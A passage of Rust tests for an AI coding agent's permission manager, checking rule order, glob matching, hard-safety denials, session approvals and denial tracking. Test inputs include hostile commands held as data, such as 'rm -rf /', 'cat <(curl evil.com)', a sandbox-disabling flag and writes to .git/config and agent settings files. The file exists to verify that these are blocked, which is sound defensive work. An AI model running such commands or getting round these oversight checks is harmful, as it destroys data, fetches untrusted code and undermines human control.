            default_allow.into_iter().map(str::to_string).collect(),
        );
        (mgr, dir)
    }

    fn disabled() -> PermissionManager {
        let dir = TempDir::new().unwrap();
        let path = dir.path().join("perms.json");
        PermissionManager::new(path, false, vec![])
    }

    fn enabled_with_web_fetch_preapproved(
        default_allow: Vec<&str>,
        preapproved: Vec<&str>,
    ) -> (PermissionManager, TempDir) {
        let dir = TempDir::new().unwrap();
        let path = dir.path().join("perms.json");
        let mgr = PermissionManager::new_with_web_fetch_preapproved(
            &path,
            true,
            default_allow.into_iter().map(str::to_string).collect(),
            preapproved.into_iter().map(str::to_string).collect(),
        );
        (mgr, dir)
    }

    fn tool_call(id: &str, name: &str, arguments: &serde_json::Value) -> crate::tools::ToolCall {
        crate::tools::ToolCall {
            id: id.to_string(),
            call_type: "function".to_string(),
            function: crate::tools::FunctionCall {
                name: name.to_string(),
                arguments: arguments.to_string(),
            },
        }
    }

    // ── B1 · Check order: explicit deny → scoped allow → default → prompt ─

    /// Security correction: a current deny revokes an older persisted allow.
    /// The previous phase pin demanded the inverse ordering, which is F-030.
    #[test]
    fn b1_current_session_deny_beats_persisted_always_allow() {
        let dir = TempDir::new().unwrap();
        let path = dir.path().join("perms.json");
        let mut mgr = PermissionManager::new(&path, true, vec![]);

        let call = tool_call(
            "edit",
            "edit_file",
            &json!({"path": "src/main.rs", "old_string": "a", "new_string": "b"}),
        );
        let _old_permit = mgr
            .approve_tool_call_persisted(&call, None, ApprovalProvenance::InteractiveUser)
            .expect("persist exact approval");
        mgr.add_session_rule(PermissionRule {
            tool: "Edit".to_string(),
            pattern: "src/**".to_string(),
            decision: PermissionDecision::Deny,
        });

        let r = mgr.authorize_tool_call(&call, None);
        assert!(
            matches!(r, AuthorizationResult::Denied(_)),
            "current explicit deny must revoke stale persisted approval, got {r:?}"
        );
    }

    /// B1-deny-1: session Deny fires before `default_allow`.
    #[test]
    fn b1_session_deny_beats_default_allow() {
        let (mut mgr, _dir) = enabled(vec!["rm **"]);
        mgr.add_session_rule(PermissionRule {
            tool: "Bash".to_string(),
            pattern: "rm **".to_string(),
            decision: PermissionDecision::Deny,
        });

        // default_allow has "rm **" but session deny fires first (step 2 vs step 3).
        let r = mgr.check("bash", &json!({"command": "rm -rf /tmp/foo"}));
        assert!(
            matches!(r, CheckResult::Denied(_)),
            "B1: session Deny must fire before default_allow; got {r:?}"
        );
    }

    /// B1-deny-2: hard safety fires before `default_allow`.
    /// A permissive default rule must not approve commands that the Bash
    /// hard denylist refuses.
    #[test]
    fn b1_hard_safety_beats_default_allow() {
        // Allow all bash commands via default_allow — no session deny rule.
        let (mgr, _dir) = enabled(vec!["**"]);

        let r = mgr.check("bash", &json!({"command": "rm -rf /"}));
        assert!(
            matches!(r, CheckResult::Denied(_)),
            "#586: hard safety must beat permissive default_allow; got {r:?}"
        );
    }

    /// B1-deny-3: empty `default_allow` with no rules → `NeedsPrompt` (deny-by-default).
    #[test]
    fn b1_empty_default_allow_yields_needs_prompt() {
        let (mgr, _dir) = enabled(vec![]);
        let r = mgr.check("bash", &json!({"command": "ls"}));
        assert!(
            matches!(r, CheckResult::NeedsPrompt { .. }),
            "B1: empty default_allow must produce NeedsPrompt, got {r:?}"
        );
    }

    // ── B2 · Invalid glob logs warning and is skipped (no panic) ──────────

    /// B2-deny-1: an invalid glob in `default_allow` never matches — the guarded
    /// call falls through to `NeedsPrompt` rather than being auto-allowed.
    #[test]
    fn b2_invalid_glob_in_default_allow_never_matches() {
        // "[unclosed" is an invalid regex that glob_to_regex_cached will fail to compile.
        let (mgr, _dir) = enabled(vec!["[unclosed"]);

        let r = mgr.check("bash", &json!({"command": "anything"}));
        // Must NOT be Allowed — invalid pattern must be skipped, not treated as allow-all.
        assert!(
            matches!(r, CheckResult::NeedsPrompt { .. }),
            "B2: invalid glob must fall through to NeedsPrompt, got {r:?}"
        );
    }

    /// B2-deny-2: empty-string glob does not let a malformed Bash call slip
    /// through. Crosslink #855: previously the "absent command key" branch
    /// of `extract_target` returned `Ok(("Bash", ""))`, which meant a
    /// `default_allow = ""` rule would allow a Bash call that omitted the
    /// `command` field entirely. The fix routes the absent-key case to
    /// the same `Err` branch as wrong-type, so the call is denied as
    /// malformed-args regardless of any allow-empty rule.
    #[test]
    fn b2_empty_glob_does_not_match_malformed_bash() {
        let (mgr, _dir) = enabled(vec![""]);

        // Non-empty bash command must NOT be allowed by the empty-string pattern.
        let r = mgr.check("bash", &json!({"command": "ls"}));
        assert!(
            matches!(r, CheckResult::NeedsPrompt { .. }),
            "B2: empty glob must not match a non-empty bash command, got {r:?}"
        );

        // Bash with absent command key is now denied as malformed args,
        // not auto-allowed by the empty pattern (crosslink #855).
        let r_malformed = mgr.check("bash", &json!({}));
        assert!(
            matches!(r_malformed, CheckResult::Denied(_)),
            "B2 + #855: empty glob must NOT auto-allow a Bash call missing \
             its `command` field; got {r_malformed:?}"
        );
    }

    /// B2-deny-3: `*` (single star) does NOT match a target containing `/`.
    /// This is the documented OC vs CC security boundary (gap #576).
    #[test]
    fn b2_single_star_does_not_match_slash() {
        let (mgr, _dir) = enabled(vec!["*"]);

        // "cat /tmp/file" contains a `/` — OC `*` → `[^/]*` which stops at `/`.
        // SECURITY: #576 — CC `*` → `.*` which WOULD match this. OC is safer here.
        let r = mgr.check("bash", &json!({"command": "cat /tmp/file"}));
        assert!(
            matches!(r, CheckResult::NeedsPrompt { .. }),
            "B2/B6 #576: single-star must not allow commands containing '/'; got {r:?}"
        );

        // A command without any `/` IS matched by `*`.
        let r_ok = mgr.check("bash", &json!({"command": "ls"}));
        assert_eq!(
            r_ok,
            CheckResult::Allowed,
            "B2: single-star must allow slash-free commands"
        );
    }

    // ── B3 · unrestricted() bypasses prompts/rules, not hard safety ───────

    /// B3-deny-1 (SECURITY: #586): `unrestricted()` still denies destructive bash.
    /// CC bypassPermissions still enforces step 1g safetyCheck; OC now does too.
    #[test]
    fn b3_unrestricted_denies_destructive_bash() {
        let mgr = PermissionManager::unrestricted();
        let r = mgr.check("bash", &json!({"command": "rm -rf /"}));
        assert!(
            matches!(r, CheckResult::Denied(_)),
            "B3 SECURITY #586: unrestricted() must deny rm -rf / via hard safety; got {r:?}"
        );
    }

    /// B3-deny-2 (SECURITY: #586): `unrestricted()` still blocks `.git/config`.
    /// CC's bypassPermissions mode still blocks .git/ writes via step 1g.
    #[test]
    fn b3_unrestricted_denies_git_config_write() {
        let mgr = PermissionManager::unrestricted();
        let r = mgr.check("edit_file", &json!({"path": ".git/config"}));
        assert!(
            matches!(r, CheckResult::Denied(_)),
            "B3 SECURITY #586: unrestricted() must deny .git/config edits; got {r:?}"
        );
    }

    /// B3-deny-3 (SECURITY: #586): `unrestricted()` blocks `.claude/settings.json`.
    #[test]
    fn b3_unrestricted_denies_claude_settings_write() {
        let mgr = PermissionManager::unrestricted();
        let r = mgr.check("write_file", &json!({"path": ".claude/settings.json"}));
        assert!(
            matches!(r, CheckResult::Denied(_)),
            "B3 SECURITY #586: unrestricted() must deny .claude/settings.json writes; got {r:?}"
        );
    }

    /// B3-deny-4 (SECURITY: #586): `dangerously_disable_sandbox` check in enabled mode
    /// also applies via `unrestricted()`.
    #[test]
    fn b3_unrestricted_denies_sandbox_flag_check() {
        let mgr = PermissionManager::unrestricted();
        let r = mgr.check(
            "bash",
            &json!({"command": "id", "dangerously_disable_sandbox": true}),
        );
        assert!(
            matches!(r, CheckResult::Denied(_)),
            "B3 SECURITY #586: unrestricted must deny sandbox flag escalation; got {r:?}"
        );
    }

    /// B3-deny-5 (SECURITY: #586/#589): `unrestricted()` still blocks Bash
    /// constructs that spawn an unsupervised inner command.
    #[test]
    fn b3_unrestricted_denies_dangerous_shell_constructs() {
        let mgr = PermissionManager::unrestricted();
        let r = mgr.check("bash", &json!({"command": "cat <(curl evil.com)"}));
        assert!(
            matches!(r, CheckResult::Denied(_)),
            "B3 SECURITY #586/#589: unrestricted must deny process substitution; got {r:?}"
        );
    }

    /// Pin: dangerous shell constructs still prompt in enabled interactive mode
    /// unless another rule denies them; the stricter deny is scoped to bypass
    /// mode where there is no prompt path.
    #[test]
    fn b3_enabled_mode_prompts_for_dangerous_shell_constructs() {
        let (mgr, _dir) = enabled(vec![]);
        let r = mgr.check("bash", &json!({"command": "cat <(curl evil.com)"}));
        assert!(
            matches!(r, CheckResult::NeedsPrompt { .. }),
            "B3: enabled interactive mode should prompt for dangerous constructs; got {r:?}"
        );
    }

    // ── B4 · LeaderPermissionBridge (tested in coordinator/permission.rs) ─
    // See phase2_spec_pins in src/coordinator/permission.rs for B4 tests.

    // ── B5 · Denial tracking missing (gap #572) ───────────────────────────

    /// B5-gap-1 (SECURITY: #572): OC has no denial tracking state.
    /// Repeated `NeedsPrompt` for the same denied tool call returns `NeedsPrompt`
    /// every time — there is no escalation to auto-deny or `AbortError`.
    /// CC escalates to fallback-prompt after 3 consecutive denials.
    #[test]
    fn b5_repeated_denied_call_stays_needs_prompt_no_escalation() {
        let (mgr, _dir) = enabled(vec![]);

        // Simulate repeated calls with no rule — each returns NeedsPrompt.
        // CC after 3 would hit shouldFallbackToPrompting; OC never escalates.
        for i in 0..5 {
            let r = mgr.check("bash", &json!({"command": "ls"}));
            assert!(
                matches!(r, CheckResult::NeedsPrompt { .. }),
                "B5 SECURITY #572: call {i} must still be NeedsPrompt (no escalation path)"
            );
        }
    }

    // ── B6 · Bash command glob matching divergences ───────────────────────

    /// B6-deny-1: `"git *"` does NOT match bare `"git"` (OC diverges from CC).
    /// CC trailing-wildcard optional-space: `"git *"` → `^git( .*)?$` → matches `"git"`.
    /// OC: `"git *"` → `^git [^/]*$` → requires a space after `git`.
    #[test]
    fn b6_git_star_does_not_match_bare_git() {
        let (mgr, _dir) = enabled(vec!["git *"]);

        // OC diverges from CC here (gap #576).
        let r = mgr.check("bash", &json!({"command": "git"}));
        assert!(
            matches!(r, CheckResult::NeedsPrompt { .. }),
            "B6 #576: OC 'git *' must not match bare 'git' (diverges from CC optional-trailing-space)"
        );
    }

    /// B6-allow-1: `"git *"` DOES match `"git status"` in both CC and OC.
    #[test]
    fn b6_git_star_matches_git_status() {
        let (mgr, _dir) = enabled(vec!["git *"]);
        let r = mgr.check("bash", &json!({"command": "git status"}));
        assert_eq!(
            r,
            CheckResult::Allowed,
            "B6: 'git *' must match 'git status'"
        );
    }

    /// B6-deny-2: `"git *"` does NOT match `"gita status"` (no space after `git`).
    /// Both CC and OC agree on this rejection.
    #[test]
    fn b6_git_star_does_not_match_gita() {
        let (mgr, _dir) = enabled(vec!["git *"]);
        let r = mgr.check("bash", &json!({"command": "gita status"}));
        assert!(
            matches!(r, CheckResult::NeedsPrompt { .. }),
            "B6: 'git *' must not match 'gita status'"
        );
    }

    /// B6-deny-3 (SECURITY: #576): `"rm *"` does NOT match `"rm /tmp/file"` in OC.
    /// CC `"rm *"` → `^rm .*$` which WOULD match (`.` matches `/`).
    /// OC `"rm *"` → `^rm [^/]*$` which does NOT match (stops at `/`).
    /// OC is MORE restrictive here; documents the portability break.
    #[test]
    fn b6_rm_star_does_not_match_path_with_slash() {
        let (mgr, _dir) = enabled(vec!["rm *"]);
        // SECURITY: #576 — OC is safer than CC for this pattern.
        let r = mgr.check("bash", &json!({"command": "rm /tmp/file"}));
        assert!(
            matches!(r, CheckResult::NeedsPrompt { .. }),
            "B6 #576: 'rm *' must not match 'rm /tmp/file' in OC (slash blocked by [^/]*)"
        );
    }

    /// B6-deny-4: CC legacy `"git:*"` prefix rule is NOT supported in OC.
    /// OC treats `:` as a literal, so `"git:*"` never matches `"git status"`.
    #[test]
    fn b6_colon_star_prefix_syntax_not_supported() {
        let (mgr, _dir) = enabled(vec!["git:*"]);
        // In CC: "git:*" is a prefix rule → matches "git status".
        // In OC: "git:*" is a glob with literal `:` → requires "git:<something>".
        let r = mgr.check("bash", &json!({"command": "git status"}));
        assert!(
            matches!(r, CheckResult::NeedsPrompt { .. }),
            "B6 #576: OC does not support CC legacy 'git:*' prefix syntax"
        );
    }

    // ── B7 · Default config is deny-by-default (Fix #282 + #581) ───────────
    //
    // Pre-fix: PermissionsConfig::default() had enabled=false → prompt/rule bypass.
    // Post-fix (#282): default is enabled=true → deny-by-default (CC parity).
    // The `disabled()` helper still constructs an explicit enabled=false manager
    // for tests that need to verify that path still short-circuits.

    /// B7-deny-1 (FIX #282 / SECURITY: #581): `PermissionsConfig::default()` now has
    /// `enabled=true`, so a fresh install is deny-by-default, matching CC.
    /// The old prompt/rule bypass posture required explicitly constructing
    /// with `enabled=false`; hard safety still applies.
    #[test]
    fn b7_default_config_is_deny_by_default_not_allow_all() {
        use crate::config::PermissionsConfig;
        let cfg = PermissionsConfig::default();
        // Post-fix: default must be enabled=true (deny-by-default).
        assert!(
            cfg.enabled,
            "FIX #282/#581: PermissionsConfig::default() must have enabled=true"
        );

        let dir = TempDir::new().unwrap();
        let path = dir.path().join("perms.json");
        let mgr = PermissionManager::new(path, cfg.enabled, cfg.default_allow);
        let r = mgr.check("bash", &json!({"command": "git status"}));
        assert!(
            matches!(r, CheckResult::NeedsPrompt { .. }),
            "FIX #282/#581: default config must deny (NeedsPrompt) ordinary bash, got {r:?}"
        );
    }

    /// B7-deny-2 (FIX #282/#586): default config blocks safety-sensitive paths.
    #[test]
    fn b7_default_config_blocks_git_config_edit() {
        use crate::config::PermissionsConfig;
        let cfg = PermissionsConfig::default();
        let dir = TempDir::new().unwrap();
        let path = dir.path().join("perms.json");
        let mgr = PermissionManager::new(path, cfg.enabled, cfg.default_allow);
        let r = mgr.check("edit_file", &json!({"path": ".git/config"}));
        assert!(
            matches!(r, CheckResult::Denied(_)),
            "FIX #282/#586: default config must hard-deny .git/config edits, got {r:?}"
        );
    }

    /// B7-explicit-disabled: explicit `enabled=false` still short-circuits
    /// ordinary calls to Allowed (the old default behaviour, now only reachable
    /// by opting out explicitly).
    #[test]
    fn b7_explicit_disabled_allows_safe_calls() {
        let mgr = disabled();
        let r = mgr.check("bash", &json!({"command": "ls -la"}));
        assert_eq!(
            r,
            CheckResult::Allowed,
            "B7: explicit enabled=false must still short-circuit safe calls to Allowed"
        );
    }

    /// B7-allow-1: enabled=true + empty `default_allow` → deny-by-default (`NeedsPrompt`).
    /// This is the correct CC-equivalent behaviour when the system is actually on.
    #[test]
    fn b7_enabled_empty_default_allow_is_deny_by_default() {
        let (mgr, _dir) = enabled(vec![]);
        for cmd in ["ls", "cargo build", "cat /etc/passwd"] {
            let r = mgr.check("bash", &json!({"command": cmd}));
            assert!(
                matches!(r, CheckResult::NeedsPrompt { .. }),
                "B7: enabled=true + empty default_allow must deny '{cmd}'; got {r:?}"
            );
        }
    }

    /// B7-deny-3: `"*"` in `default_allow` does NOT catch commands with `/` (OC vs CC divergence).
    /// Spec §B7 edge case: OC `*` → `[^/]*`; CC `*` → `.*` (catches `/`).
    #[test]
    fn b7_catchall_star_does_not_allow_slash_commands() {
        let (mgr, _dir) = enabled(vec!["*"]);
        // SECURITY: #576 — OC is MORE restrictive than CC for catchall `*`.
        let r = mgr.check("bash", &json!({"command": "cat /tmp/file"}));
        assert!(
            matches!(r, CheckResult::NeedsPrompt { .. }),
            "B7 #576: OC '*' catchall must not allow commands containing '/' (diverges from CC '.*')"
        );
    }

    // ── Denial path edge-case battery ────────────────────────────────────

    /// Deny: session Deny on `write_file` fires before `default_allow`.
    #[test]
    fn deny_session_deny_write_beats_default_allow() {
        let (mut mgr, _dir) = enabled(vec!["Write(**)"]);
        mgr.add_session_rule(PermissionRule {
            tool: "Write".to_string(),
            pattern: "**".to_string(),
            decision: PermissionDecision::Deny,
        });
        let r = mgr.check("write_file", &json!({"path": "anywhere/file.txt"}));
        assert!(
            matches!(r, CheckResult::Denied(_)),
            "deny: session Deny on Write must fire before default_allow 'Write(**)'"
        );
    }

    /// Deny: session Deny on a different tool does not affect another tool.
    #[test]
    fn deny_session_deny_does_not_cross_tool_boundary() {
        let (mut mgr, _dir) = enabled(vec!["Write(**)"]);
        mgr.add_session_rule(PermissionRule {
            tool: "Bash".to_string(),
            pattern: "**".to_string(),
            decision: PermissionDecision::Deny,
        });
        // Write is not denied — its explicitly scoped default still fires.
        let r = mgr.check("write_file", &json!({"path": "foo.txt"}));
        assert_eq!(
            r,
            CheckResult::Allowed,
            "deny: Bash Deny must not affect Write"
        );
    }

    #[test]
    fn legacy_unqualified_default_allow_cannot_cross_from_bash_to_write() {
        let (mgr, _dir) = enabled(vec!["src/**"]);
        let result = mgr.check("write_file", &json!({"path": "src/main.rs"}));
        assert!(matches!(result, CheckResult::NeedsPrompt { .. }));
    }

    #[test]
    fn scoped_default_allow_canonicalizes_wire_tool_alias() {
        let (mgr, _dir) = enabled(vec!["write_file(src/**)"]);
        assert_eq!(
            mgr.check("write_file", &json!({"path": "src/main.rs"})),
            CheckResult::Allowed
        );
        assert!(matches!(
            mgr.check("edit_file", &json!({"path": "src/main.rs"})),
            CheckResult::NeedsPrompt { .. }
        ));
    }

    /// Deny: malformed bash args (non-string command) are denied, not allowed.
    /// This is a security invariant regardless of `default_allow`.
    #[test]
    fn deny_malformed_bash_args_denied_regardless_of_default_allow() {
        let (mgr, _dir) = enabled(vec!["Bash(**)"]);
        let r = mgr.check("bash", &json!({"command": true}));
        assert!(
            matches!(r, CheckResult::Denied(_)),
            "malformed bash args must be Denied even when default_allow='Bash(**)'"
        );
    }

    /// Deny: malformed `edit_file` args are denied even with permissive `default_allow`.
    #[test]
    fn deny_malformed_edit_args_denied_regardless_of_default_allow() {
        let (mgr, _dir) = enabled(vec!["Edit(**)"]);
        let r = mgr.check("edit_file", &json!({"path": 42}));
        assert!(matches!(r, CheckResult::Denied(_)));
    }

    /// Deny: tool case-insensitive matching — "edit" rule matches "Edit" tool.
    #[test]
    fn deny_tool_name_case_insensitive_session_rule() {
        let (mut mgr, _dir) = enabled(vec![]);
        mgr.add_session_rule(PermissionRule {
            tool: "edit".to_string(), // lower-case rule
            pattern: "**".to_string(),
            decision: PermissionDecision::Deny,
        });
        let r = mgr.check("edit_file", &json!({"path": "src/main.rs"}));
        assert!(
            matches!(r, CheckResult::Denied(_)),
            "tool name matching must be case-insensitive"
        );
    }

    // ------------------------------------------------------------------
    // crosslink #724 / S-017 — exact session approvals replace tool caches
    // ------------------------------------------------------------------

    #[test]
    fn tui_724_exact_session_approval_survives_arc_sharing() {
        use std::sync::Arc;
        let (mgr, _dir) = enabled(vec![]);
        let shared = Arc::new(mgr);
        let clone = Arc::clone(&shared);
        let first = tool_call("first", "bash", &json!({"command": "git status"}));
        let replay = tool_call("replay", "bash", &json!({"command": "git status"}));

        let _first_permit = clone
            .approve_tool_call_for_session(&first, "session-1", ApprovalProvenance::InteractiveUser)
            .expect("session approval");

        assert!(
            matches!(
                shared.authorize_tool_call(&replay, Some("session-1")),
                AuthorizationResult::Allowed(_)
            ),
            "the exact approval must persist across Arc handles and batches"
        );
    }

    #[test]
    fn tui_724_session_approval_does_not_cross_arguments_or_session() {
        let (mgr, _dir) = enabled(vec![]);
        let approved = tool_call("approved", "bash", &json!({"command": "git status"}));
        let changed = tool_call("changed", "bash", &json!({"command": "git push"}));
        let replay = tool_call("replay", "bash", &json!({"command": "git status"}));
        let _permit = mgr
            .approve_tool_call_for_session(
                &approved,
                "session-1",
                ApprovalProvenance::InteractiveUser,
            )
            .expect("session approval");

        assert!(matches!(
            mgr.authorize_tool_call(&changed, Some("session-1")),
            AuthorizationResult::NeedsPrompt { .. }
        ));
        assert!(matches!(
            mgr.authorize_tool_call(&replay, Some("session-2")),
            AuthorizationResult::NeedsPrompt { .. }
        ));
    }

    #[test]
    fn tui_724_exact_session_denial_dominates_older_approval() {
        let (mgr, _dir) = enabled(vec![]);
        let call = tool_call("call", "bash", &json!({"command": "git status"}));
        let _permit = mgr
            .approve_tool_call_for_session(&call, "session-1", ApprovalProvenance::InteractiveUser)
            .expect("session approval");
        mgr.deny_tool_call_for_session(&call, "session-1", ApprovalProvenance::InteractiveUser)
            .expect("exact denial");

        assert!(matches!(
            mgr.authorize_tool_call(&call, Some("session-1")),
            AuthorizationResult::Denied(_)
        ));
    }

    // ── S-016 mandatory effect classification ───────────────────────────
    //
    // These replace the #782 `permission_target()` pins. #782 inverted the
    // dependency so each handler declared its own target, but left the
    // declaration optional: `permission_target()` defaulted to `None`, `None`
    // meant "read-only / safe", and the accompanying test accepted a
    // hand-maintained `KNOWN_SAFE` allowlist as an "explicit decision".
    // Twenty-eight handlers sat in that allowlist, including worktree
    // removal, cron mutation and Crosslink writes. F-001 records that shape
    // as fail-open and F-052 records the Crosslink case specifically.
    //
    // The declaration is now mandatory (no trait default) and the allowlist
    // is gone. What these tests prove is behaviour, not the presence of a
    // constant: that a classified mutation actually reaches a decision, and
    // that an unclassifiable call is actually denied.

    /// `bash` resolves through its declaration to the (Bash, command) pair.
    #[test]
    fn effect_bash_resolves_declared_target() {
        let r = crate::tools::effect::resolve_for_call("bash", &json!({"command": "ls -la"}))
            .expect("bash must classify");
        assert_eq!(r.canonical, "Bash");
        assert_eq!(r.target, "ls -la");
        assert_eq!(r.effect, crate::tools::effect::ToolEffect::Destructive);
    }

    /// Malformed args for a declared target argument deny, even under a
    /// permissive `default_allow`.
    #[test]
    fn malformed_args_for_any_target_are_denied() {
        let (mgr, _dir) = enabled(vec!["Edit(**)"]);
        let r = mgr.check(
            "notebook_edit",
            &json!({"notebook_path": 42, "new_source": "x"}),
        );
        assert!(
            matches!(r, CheckResult::Denied(_)),
            "malformed notebook_path (int) must be Denied regardless of default_allow, got: {r:?}"
        );
    }

    /// F-001's headline: an unknown tool name is denied, not allowed.
    ///
    /// The old `extract_target` returned `None` for an unregistered name and
    /// `check` read that as allow.
    #[test]
    fn unknown_tool_is_denied_not_allowed() {
        let (mgr, _dir) = enabled(vec!["**"]);
        let r = mgr.check("definitely_not_a_tool", &json!({"path": "/etc/passwd"}));
        assert!(
            matches!(r, CheckResult::Denied(_)),
            "an unclassified tool name must be denied, got: {r:?}"
        );
    }

    /// F-001: an unknown tool must not score as unconditionally safe.
    #[test]
    fn unknown_tool_auto_allow_score_is_zero() {
        assert!(
            auto_allow_score("definitely_not_a_tool", &json!({})) < f32::EPSILON,
            "an unclassified tool scored as auto-allowable is the #F-001 fail-open"
        );
    }

    /// #603: `web_fetch` declares a permission target, but the default
    /// preapproved documentation catalog bypasses the prompt for known hosts.
    #[test]
    fn web_fetch_preapproved_default_catalog_returns_allowed() {
        let (mgr, _dir) = enabled(vec![]);
        let r = mgr.check("web_fetch", &json!({"url": "https://docs.python.org/3/"}));
        assert_eq!(
            r,
            CheckResult::Allowed,
            "#603: docs.python.org is in the default preapproved web_fetch catalog"
        );
    }

    /// #603: user config can explicitly disable the preapproved catalog by
    /// setting `web_fetch.preapproved_domains = []`.
    #[test]
    fn web_fetch_empty_preapproved_catalog_needs_prompt() {
        let (mgr, _dir) = enabled_with_web_fetch_preapproved(vec![], vec![]);
        let r = mgr.check("web_fetch", &json!({"url": "https://docs.python.org/3/"}));
        assert_eq!(
            r,
            CheckResult::NeedsPrompt {
                tool: "WebFetch".to_string(),
                target: "https://docs.python.org/3/".to_string(),
            },
            "#603: empty preapproved catalog must not silently allow web_fetch"
        );
    }

    /// #603: arbitrary hosts still prompt even when the default catalog is
    /// populated.
    #[test]
    fn web_fetch_non_preapproved_host_needs_prompt() {
        let (mgr, _dir) = enabled(vec![]);
        let r = mgr.check("web_fetch", &json!({"url": "https://example.invalid/"}));
        assert_eq!(
            r,
            CheckResult::NeedsPrompt {
                tool: "WebFetch".to_string(),
                target: "https://example.invalid/".to_string(),
            },
            "#603: only configured documentation hosts bypass the web_fetch prompt"
        );
    }

    /// Every registered handler carries a structurally valid declaration.
    ///
    /// The declaration itself is compulsory at compile time, so this asserts
    /// the part the compiler cannot: that the declaration is usable by the
    /// rule engine, and that no handler is silently unreachable.
    #[test]
    fn every_handler_declares_a_valid_effect() {
        for handler in crate::tools::registry::iter_handlers() {
            let name = handler.name();
            let spec = handler.effect_spec();
            spec.validate(name)
                .unwrap_or_else(|e| panic!("handler '{name}' has an unusable declaration: {e}"));
        }
    }

    /// Every tool that mutates state, spawns a process, or leaves the host
    /// must reach an authorization decision.
    ///
    /// This is the concrete list F-001 named as fail-open. It is expressed as
    /// "must NOT be read-only" rather than as an allowlist of exceptions, so
    /// the test cannot be satisfied by adding a name to a table.
    #[test]
    fn known_effectful_tools_require_authorization() {
        for name in [
            "bash",
            "write_file",
            "edit_file",
            "notebook_edit",
            "crosslink",
            "cron_create",
            "cron_delete",
            "enter_worktree",
            "exit_worktree",
            "task_create",
            "task_update",
            "todo_write",
            "kill_shell",
            "kill_shells_for_agent",
            "lsp",
            "list_mcp_resources",
            "read_mcp_resource",
            "web_fetch",
            "enter_plan_mode",
            "exit_plan_mode",
        ] {
            let handler = crate::tools::registry::registry()
                .get(name)
                .unwrap_or_else(|| panic!("{name} must be registered"));
            assert!(
                handler.effect_spec().effect.requires_authorization(),
                "{name} was named in F-001 as fail-open; it must not be classified read-only"
            );
        }
    }

    // ── Crosslink #570: PermissionContext tests ────────────────────────────

    /// Pin: `Interactive` context preserves the legacy `NeedsPrompt`
    /// fall-through (back-compat with the single `check()` API).
    #[test]
    fn check_with_context_interactive_returns_needs_prompt() {
        let (mgr, _dir) = enabled(vec![]);
        let r = mgr.check_with_context(
            "bash",
            &json!({"command": "ls"}),
            PermissionContext::Interactive,
        );
        assert!(
            matches!(r, CheckResult::NeedsPrompt { .. }),
            "#570: Interactive must yield NeedsPrompt for unmatched bash, got: {r:?}"
        );
    }

    /// Pin: `SwarmWorker` context converts `NeedsPrompt` to `Denied`
    /// because there is no UI to consult.
    #[test]
    fn check_with_context_swarm_worker_denies_default() {
        let (mgr, _dir) = enabled(vec![]);
        let r = mgr.check_with_context(
            "bash",
            &json!({"command": "ls"}),
            PermissionContext::SwarmWorker,
        );
        assert!(
            matches!(r, CheckResult::Denied(_)),
            "#570: SwarmWorker must default-deny unmatched calls, got: {r:?}"
        );
    }

    /// Pin: explicit allow rules still allow under all contexts —
    /// the context only changes the unmatched-rule projection.
    #[test]
    fn check_with_context_explicit_allow_works_under_swarm_worker() {
        let (mgr, _dir) = enabled(vec!["ls *"]);
        let r = mgr.check_with_context(
            "bash",
            &json!({"command": "ls -la"}),
            PermissionContext::SwarmWorker,
        );
        assert_eq!(
            r,
            CheckResult::Allowed,
            "#570: explicit allow must survive swarm-worker context"
        );
    }

    /// Pin: `Coordinator` mirrors `SwarmWorker` today (reserved for #619).
    #[test]
    fn check_with_context_coordinator_default_denies() {
        let (mgr, _dir) = enabled(vec![]);
        let r = mgr.check_with_context(
            "bash",
            &json!({"command": "ls"}),
            PermissionContext::Coordinator,
        );
        assert!(matches!(r, CheckResult::Denied(_)));
    }

    // ── Crosslink #571 / S-020: typed auto-allow tests ─────────────────────

    /// Pin: read-only tools (e.g. `read_file`, `list_files`) score 1.0.
    #[test]
    fn auto_allow_score_read_only_is_one() {
        assert!(
            (auto_allow_score("read_file", &json!({"path": "/x"})) - 1.0).abs() < f32::EPSILON,
            "read_file's declared ReadOnly effect must score 1.0"
        );
        assert!((auto_allow_score("list_files", &json!({})) - 1.0).abs() < f32::EPSILON);
    }

    /// Bash remains effectful regardless of how benign its text appears.
    #[test]
    fn auto_allow_score_every_bash_shape_is_zero() {
        for command in [
            "ls -la",
            "git status",
            "git push origin HEAD",
            "python3 -c 'print(1)'",
            "cat input | rm -f output",
        ] {
            assert!(auto_allow_score("bash", &json!({"command": command})) < f32::EPSILON);
        }
    }

    /// A benign-looking Bash command falls through to explicit policy.
    #[test]
    fn check_auto_allow_bash_requires_policy() {
        let (mgr, _dir) = enabled(vec![]);
        let r = mgr.check_auto_allow("bash", &json!({"command": "ls"}), 0.0);
        assert!(matches!(r, CheckResult::NeedsPrompt { .. }));
    }

    /// Explicit denials remain authoritative before typed auto-approval.
    #[test]
    fn check_auto_allow_explicit_deny_overrides_classifier() {
        let (mut mgr, _dir) = enabled(vec![]);
        mgr.add_session_rule(PermissionRule {
            tool: "Bash".to_string(),
            pattern: "ls*".to_string(),
            decision: PermissionDecision::Deny,
        });
        let r = mgr.check_auto_allow("bash", &json!({"command": "ls"}), 0.8);
        assert!(
            matches!(r, CheckResult::Denied(_)),
            "explicit Deny must beat typed auto-approval, got: {r:?}"
        );
    }

    /// Invalid thresholds cannot create auto-approval authority.
    #[test]
    fn check_auto_allow_invalid_threshold_falls_through() {
        let (mgr, _dir) = enabled(vec![]);
        for threshold in [f32::NAN, -0.1, 1.1] {
            let r = mgr.check_auto_allow("bash", &json!({"command": "ls"}), threshold);
            assert!(matches!(r, CheckResult::NeedsPrompt { .. }));
        }
    }

    // ── Crosslink #577: DenialTracker tests ────────────────────────────────

    /// Pin: a fresh tracker starts at zero with default limits.
    #[test]
    fn denial_tracker_starts_zero_with_default_limits() {
        let t = DenialTracker::new();
        assert_eq!(t.consecutive(), 0);
        assert_eq!(t.total(), 0);
        assert_eq!(t.limits().max_consecutive, MAX_CONSECUTIVE_DENIALS);
        assert_eq!(t.limits().max_total, MAX_TOTAL_DENIALS);
        assert_eq!(t.escalation_state(), EscalationState::Normal);
    }

    /// Pin: `record_denial` increments both counters and `record_allowed`
    /// resets only the consecutive counter.
    #[test]
    fn denial_tracker_record_paths() {
        let mut t = DenialTracker::new();
        t.record_denial();
        t.record_denial();
        assert_eq!(t.consecutive(), 2);
        assert_eq!(t.total(), 2);
        t.record_allowed();
        assert_eq!(
            t.consecutive(),
            0,
            "#577: record_allowed resets consecutive counter"
        );
        assert_eq!(
            t.total(),
            2,
            "#577: record_allowed must NOT touch total counter"
        );
    }

    /// Pin: crossing either threshold flips `escalation_state` to
